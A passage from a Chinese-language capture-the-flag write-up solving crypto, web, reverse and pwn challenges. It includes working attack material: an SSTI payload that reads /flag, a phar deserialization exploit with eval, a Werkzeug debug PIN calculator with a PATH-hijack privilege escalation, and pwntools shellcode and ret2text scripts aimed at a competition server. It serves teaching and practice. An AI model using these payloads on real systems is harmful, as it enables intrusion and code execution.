class="built_in">pow</span>(M,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span></span><br><span class="line"><span class="comment"># c = 12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span></span><br></pre></td></tr></table></figure></blockquote><p>$c = M^e \bmod n = (2022mep)^e \bmod n$，令 $c’ = c \cdot (2022e)^{-e} \bmod n = (mp)^e \bmod n = (m^ep^{e-1} \bmod n) \cdot p$，</p><p>故 $\gcd(c’,n)=p$，再利用常规RSA求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span></span><br><span class="line">c = <span class="number">12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">cc = c * inverse_mod(<span class="built_in">pow</span>(<span class="number">2022</span>*e,e,n),n)</span><br><span class="line">p = gcd(cc,n)</span><br><span class="line">q = n // p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(cc,d,n) // p</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;3e5e2789a93a80615cc35edbff397c05&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="Operator"><a href="#Operator" class="headerlink" title="Operator"></a>Operator</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">&quot;*******************MASK****************&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(FLAG)</span></span><br><span class="line">number1 = getPrime(<span class="number">512</span>)</span><br><span class="line">number2 = getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(number1)</span><br><span class="line">result = FLAG * number1 % number2</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span></span><br><span class="line"><span class="string">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>$m$ 与 $n_1$ （512位）乘积的大小不会超过 $n_2$ 大小（1024位），故 $c=mn_1$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span></span><br><span class="line">c = <span class="number">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(c//n1)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;qMmZqWvmj70bBsCfmVLT&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="EZVC"><a href="#EZVC" class="headerlink" title="EZVC"></a>EZVC</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line">alphabet = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;HSC&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;HSCSEC&#123;&#x27;</span>)</span><br><span class="line">flag_num_list = []</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> flag:</span><br><span class="line">    flag_num_list.append(alphabet.find(item) + <span class="number">1</span>)</span><br><span class="line">key_num = alphabet.find(key) + <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag_num_list:</span><br><span class="line">    m = (i + key_num) % <span class="number">94</span> - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> m == <span class="number">0</span>:</span><br><span class="line">        c.append(<span class="string">&quot;□&quot;</span>)</span><br><span class="line">    c.append(alphabet[m-<span class="number">1</span>:m])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&#x27;&#x27;</span>.join(c)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|</span></span><br></pre></td></tr></table></figure></blockquote><p>代码里面的 <code>key_num</code> 其实固定为0，实际当1，模运算也没啥用，实际是rot1凯撒加密，还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">&#x27;GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|&#x27;</span></span><br><span class="line">alphabet = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line">flag = [alphabet[alphabet.index(k)+<span class="number">1</span>] <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># HSCSEC&#123;kh21jk3h12j-h312hj-3hj3-123jhbjhbhj&#125;</span></span><br></pre></td></tr></table></figure><p>​</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="EZSSTI"><a href="#EZSSTI" class="headerlink" title="EZSSTI"></a>EZSSTI</h3><p>基本没过滤的SSTI，尝试</p><p><code>?name=&#123;&#123;sss.__init__.__globals__.__builtins__.open("/flag").read()&#125;&#125;</code></p><p>报错无法打开 <code>/</code> ，说明 <code>flag</code> 被替换为空，双写绕过即可：</p><p><code>?name=&#123;&#123;sss.__init__.__globals__.__builtins__.open("/flflagag").read()&#125;&#125;</code></p><p>​</p><h3 id="EASYPHY"><a href="#EASYPHY" class="headerlink" title="EASYPHY"></a>EASYPHY</h3><p>查看首页源码，发现upload和view两个对话框包括关键字段 <code>name=&quot;acti0n&quot;</code>，抓包看到 <code>?acti0n=upload</code> 的访问方式，为文件包含漏洞点。</p><p>通过设置 <code>acti0n</code> 参数和filter过滤器访问，得到 <code>upload.php</code> 和 <code>view.php</code> 源码。审计代码，<code>upload.php</code> 中包含上传文件与拦截过滤危险函数的功能，<code>view.php</code> 中有 <code>eval()</code> 函数，只需要修改类中的私有变量 <code>$cmd</code> 就可以拿到shell。</p><p>其中 <code>file_exists()</code> 函数结合文件上传可以想到phar反序列化漏洞利用。结合 <code>upload.php</code> 中关键字黑名单，使用 <code>show_source()</code> 函数读取 <code>flag.php</code> 文件。</p><p>构造phar文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">View</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&#x27;show_source(&quot;flag.php&quot;);&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); </span><br><span class="line">    <span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">View</span>();</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本地运行生成 <code>phar.phar</code>，然后直接上传。文件上传成功之后，通过 <code>delete</code> 这个参数来触发 <code>file_exists()</code> 才可以利用phar，POST参数 <code>delete=phar://phar.phar</code> 即可拿到flag。</p><p>​</p><h3 id="EZSYFLASK"><a href="#EZSYFLASK" class="headerlink" title="EZSYFLASK"></a>EZSYFLASK</h3><p>有一个可以文件包含的路由：<code>GET /view?filename=app.py</code>，得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;GET /view?filename=app.py&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/view&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">viewFile</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> filename):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;WAF&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;cgroup&quot;</span> <span class="keyword">in</span> filename):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;WAF&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;self&quot;</span> <span class="keyword">in</span> filename):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;WAF&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            templates=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">            &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;文件存在&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;/head&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;</span></span><br><span class="line"><span class="string">            &#123;&#125;</span></span><br><span class="line"><span class="string">            &lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;/html&gt;</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(f.read())</span><br><span class="line">            <span class="keyword">return</span> render_template_string(templates)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        templates=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;文件不存在&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;</span></span><br><span class="line"><span class="string">        文件不存在</span></span><br><span class="line"><span class="string">        &lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template_string(templates)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">80</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>去除参数可以触发debug报错页，计算PIN值可以进入调试模式。由于禁用了 <code>flag/self/cgroup</code>，<code>/proc/self/cgroup</code> 获取不到，可以利用 <code>/proc/1/mountinfo</code> 获取docker-id：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &gt;=3.8 sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;app&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&#x27;0242ac0208fe&#x27;</span>,<span class="number">16</span>)),<span class="comment">#  /sys/class/net/eth0/address 16进制转10进制</span></span><br><span class="line">    <span class="comment">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/1/mountinfo</span></span><br><span class="line">    <span class="string">&#x27;7265fe765262551a676151a24c02b7b6&#x27;</span>+<span class="string">&#x27;bcf34bfb0be38980dddd4de1d57a8b7da2de7843ee55ed110016b97f5163406c&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>输入PIN码进入调试模式，在根目录下发现 <code>/flag</code> 和 <code>/readflag</code>，<code>/flag</code> 无权限读，而 <code>/readflag</code> 有SUID权限，需要提权：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo \&quot;/bin/bash\&quot;&gt;ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /</span><br><span class="line">./readflag</span><br></pre></td></tr></table></figure><p>输入 <code>print(os.popen(&quot;cd /tmp;echo \&quot;/bin/bash\&quot;&gt;ps;chmod 777 ps;echo $PATH;export PATH=/tmp:$PATH;cd /;./readflag&quot;).read())</code> 得flag。</p><p>​</p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="DECOMPILEONEOONE"><a href="#DECOMPILEONEOONE" class="headerlink" title="DECOMPILEONEOONE"></a>DECOMPILEONEOONE</h3><p>照代码逻辑还原即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = [<span class="number">0x5C797E8971697066</span>,<span class="number">0x8D83497D7F6F7A3D</span>,<span class="number">0x949DA8758277A9A5</span>,<span class="number">0xB7954D7C</span>]</span><br><span class="line">cc = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    cc += <span class="built_in">list</span>(long_to_bytes(k)[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>):</span><br><span class="line">    <span class="keyword">if</span> (i&amp;<span class="number">1</span>)!=<span class="number">0</span>:</span><br><span class="line">        cc[i] = cc[i]+i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cc[i] = cc[i]+i</span><br><span class="line">    cc[i] ^= i + <span class="number">1</span></span><br><span class="line">    cc[i] -= <span class="number">3</span> * i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(cc))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;reV3rSe_1s_sucH_hanD1e&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="Whack-a-mole"><a href="#Whack-a-mole" class="headerlink" title="Whack-a-mole"></a>Whack-a-mole</h3><p>动调过反调试和中间的判断条件，使得流程走向正确的处理函数里，最后在 <code>Source</code> 字符串中查看到已修改得到的字符串：<code>w1n32_aP</code> 和 <code>i_iS_FUn</code>，连接得flag：<code>flag&#123;w1n32_aPi_iS_FUn&#125;</code>。</p><p>​</p><h3 id="Base-secrets"><a href="#Base-secrets" class="headerlink" title="Base secrets"></a>Base secrets</h3><p>rust程序，比较难看，结合题目 <code>Base</code> 跟踪一下代码逻辑，发现编码后的字符串 <code>hexZh3tyVXM3X2AwX35yM+IxRU1nkz5nmWdzhXdF7Qo=</code>。</p><p>跟进到encode代码部分，提取出码表为 <code>456789+-IJKLMNOPQRSTUVWXghijklmnYZabcdefopqrstuvwxyz0123ABCDEFGH</code>，</p><p>base64解码得flag：<code>flag&#123;rUs7_n0_pr0b1EM_s0_yisey&#125;</code>。</p><p>​</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="EZPWN"><a href="#EZPWN" class="headerlink" title="EZPWN"></a>EZPWN</h3><p>简单ret2shellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;43.143.254.94&#x27;</span>,<span class="number">10059</span>)</span><br><span class="line"></span><br><span class="line">buf2=<span class="number">0x404080</span></span><br><span class="line">pl=asm(shellcraft.sh()).ljust(<span class="number">0x110</span>,<span class="string">&#x27;a&#x27;</span>)+p64(buf2)+p64(buf2)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​</p><h3 id="Morris-II"><a href="#Morris-II" class="headerlink" title="Morris II"></a>Morris II</h3><p>在 <code>main() -&gt; fight_system() -&gt; confirm_input() -&gt; read()</code> 中发现明显的栈溢出漏洞，有backdoor，再ret2text即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;43.143.254.94&#x27;</span>,<span class="number">10396</span>)</span><br><span class="line"></span><br><span class="line">dontlookatme=<span class="number">0x401236</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;from below：&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;hero\&#x27;s name!:\n&#x27;</span>)</span><br><span class="line">pl=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(ret)+p64(dontlookatme)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span 